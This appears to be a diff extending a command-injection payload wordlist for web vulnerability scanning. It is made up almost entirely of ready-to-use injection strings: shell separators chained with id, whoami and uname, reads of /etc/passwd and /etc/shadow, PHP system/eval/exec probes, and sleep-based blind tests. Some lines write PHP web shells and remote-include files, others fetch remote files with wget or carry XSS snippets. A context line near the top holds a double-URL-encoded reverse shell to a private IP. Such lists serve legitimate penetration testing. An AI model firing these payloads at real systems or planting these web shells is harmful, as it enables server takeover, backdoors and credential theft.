@@ -42,4 +42,361 @@ ${(@print(system(`dir`))}
 %2524%257b%2540%2570%2572%2569%256e%2574%2528%2573%2579%2573%2574%2565%256d%2528%2522%252f%2562%2569%256e%252f%2562%2561%2573%2568%2520%252d%2563%2520%2527%2562%2561%2573%2568%2520%252d%2569%2520%253e%2526%2520%252f%2564%2565%2576%252f%2574%2563%2570%252f%2531%2539%2532%252e%2531%2536%2538%252e%2531%2530%252e%2538%2534%252f%2531%2532%2533%2534%2520%2530%253e%2526%2531%2527%2522%2529%2529%257d
 ${@print("dir")}
 ${@print(`dir`)}
+${(@print(system(`2+2111`))}
+||${(@print(system("2+2111"))}
+;${(@print(system("2+2111"))}
+;%20${(@print(system("2+2111"))}
+;${(@print(system(`2+2111`))}
+||${(@print(system(`2+2111`))}
+;%20${(@print(system(`2+2111`))}
+;${`2+2111`}
+||%20${`2+2111`}
+@print(`2+2111`)
+@print("2+2111")
+${@print("2+2111")}
+${@print(`2+2111`)}
+whoami
+| whoami
+; whoami
+' whoami
+' || whoami
+' & whoami
+' && whoami
+'; whoami
+" whoami
+" || whoami
+" | whoami
+" & whoami
+" && whoami
+"; whoami
+$(`whoami`)
+& whoami
+&& whoami
+{{2+2111}}
+uname
+;uname;
+| uname -a
+; uname -a
+& uname -a
+&& uname -a
+uname -a
+|/usr/bin/id
+;|/usr/bin/id|
+;/usr/bin/id|
+$;/usr/bin/id
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+systeminfo
+| systeminfo
+; systeminfo
+& systeminfo
+&& systeminfo
+system('ls')
+system('pwd')
+system('pwd');
+|| system('sleep 5');
+| system('sleep 5');
+; system('sleep 5');
+& system('sleep 5');
+&& system('sleep 5');
+system('sleep 5')
+system('sleep 5');
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
+system('whoami')
+system('whoami');
+| sleep 1
+; sleep 1
+& sleep 1
+&& sleep 1
+sleep 1
+|| sleep 10
+| sleep 10
+; sleep 10
+{${sleep(10)}}
+& sleep 10 
+&& sleep 10
+sleep 10
+|| sleep 15
+| sleep 15
+; sleep 15
+& sleep 15 
+&& sleep 15
+ {${sleep(20)}}
+{${sleep(20)}}
+ {${sleep(3)}}
+{${sleep(3)}}
+| sleep 5
+; sleep 5
+& sleep 5
+&& sleep 5
+sleep 5
+ {${sleep(hexdec(dechex(20)))}} 
+{${sleep(hexdec(dechex(20)))}} 
+sysinfo
+| sysinfo
+; sysinfo
+& sysinfo
+&& sysinfo
+| net view
+; net view
+& net view
+&& net view
+net view
+\nid|
+\nid;
+\nid\n
+\n/usr/bin/id\n
+perl -e 'print "X"x1024'
+|| perl -e 'print "X"x16096'
+| perl -e 'print "X"x16096'
+; perl -e 'print "X"x16096'
+& perl -e 'print "X"x16096'
+&& perl -e 'print "X"x16096'
+perl -e 'print "X"x16384'
+; perl -e 'print "X"x2048'
+& perl -e 'print "X"x2048'
+&& perl -e 'print "X"x2048'
+perl -e 'print "X"x2048'
+|| perl -e 'print "X"x4096'
+| perl -e 'print "X"x4096'
+; perl -e 'print "X"x4096'
+& perl -e 'print "X"x4096'
+&& perl -e 'print "X"x4096'
+perl -e 'print "X"x4096'
+|| perl -e 'print "X"x8096'
+| perl -e 'print "X"x8096'
+; perl -e 'print "X"x8096'
+&& perl -e 'print "X"x8096'
+perl -e 'print "X"x8192'
+perl -e 'print "X"x81920'
+|| phpinfo()
+| phpinfo()
+ {${phpinfo()}}
+;phpinfo()
+;phpinfo();//
+';phpinfo();//
+{${phpinfo()}}
+& phpinfo()
+&& phpinfo()
+phpinfo()
+phpinfo();
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+eval('ls')
+eval('pwd')
+eval('pwd');
+eval('sleep 5')
+eval('sleep 5');
+eval('whoami')
+eval('whoami');
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+exec('ls')
+exec('pwd')
+exec('pwd');
+exec('sleep 5')
+exec('sleep 5');
+exec('whoami')
+exec('whoami');
+;{$_GET["cmd"]}
+`id`
+|id
+| id
+;id
+;id|
+;id;
+& id
+&&id
+;id\n
+ifconfig
+| ifconfig
+; ifconfig
+& ifconfig
+&& ifconfig
+/index.html|id|
+ipconfig
+| ipconfig /all
+; ipconfig /all
+& ipconfig /all
+&& ipconfig /all
+ipconfig /all
+ls
+$(`ls`)
+| ls -l /
+; ls -l /
+& ls -l /
+&& ls -l /
+ls -l /
+| ls -laR /etc
+; ls -laR /etc
+& ls -laR /etc
+&& ls -laR /etc
+| ls -laR /var/www
+; ls -laR /var/www
+& ls -laR /var/www
+&& ls -laR /var/www
+| ls -l /etc/
+; ls -l /etc/
+& ls -l /etc/
+&& ls -l /etc/
+ls -l /etc/
+ls -lh /etc/
+| ls -l /home/*
+; ls -l /home/*
+& ls -l /home/*
+&& ls -l /home/*
+ls -l /home/*
+*; ls -lhtR /var/www/
+| ls -l /tmp
+; ls -l /tmp
+& ls -l /tmp
+&& ls -l /tmp
+ls -l /tmp
+| ls -l /var/www/*
+; ls -l /var/www/*
+& ls -l /var/www/*
+&& ls -l /var/www/*
+ls -l /var/www/*
+dir
+| dir
+; dir
+$(`dir`)
+& dir
+&&dir
+&& dir
+| dir C:\
+; dir C:\
+& dir C:\
+&& dir C:\
+dir C:\
+| dir C:\Documents and Settings\*
+; dir C:\Documents and Settings\*
+& dir C:\Documents and Settings\*
+&& dir C:\Documents and Settings\*
+dir C:\Documents and Settings\*
+| dir C:\Users
+; dir C:\Users
+& dir C:\Users
+&& dir C:\Users
+dir C:\Users
+;echo%20'<script>alert(1)</script>'
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+| echo "<?php include($_GET['page'])| ?>" > rfi.php
+; echo "<?php include($_GET['page']); ?>" > rfi.php
+& echo "<?php include($_GET['page']); ?>" > rfi.php
+&& echo "<?php include($_GET['page']); ?>" > rfi.php
+echo "<?php include($_GET['page']); ?>" > rfi.php
+| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
+; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
+; echo "<?php system($_GET['cmd']); ?>" > cmd.php
+& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+echo "<?php system($_GET['cmd']); ?>" > cmd.php
+;echo '<script>alert(1)</script>'
+echo '<script>alert(1)</script>'// XXXXXXXXXXX
+%20{${phpinfo()}}
+%20{${sleep(20)}}
+%20{${sleep(3)}}
+a|id|
+a;id|
+a;id;
+a;id\n
+`
+|| 
+| 
+; 
+'
+'"
+"
+"'
+& 
+&& 
+%0a
+%0a%0d
 
+%0Aid
+%0a id %0a
+%0Aid%0A
+%0a ping -i 30 127.0.0.1 %0a
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+cat /etc/hosts
+$(`cat /etc/passwd`)
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+`ping 127.0.0.1`
+| id
+& id
+; id
+%0a id %0a
+`id`
+$;/usr/bin/id
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system('cat%20/etc/passwd')
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+a|/usr/bin/id
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
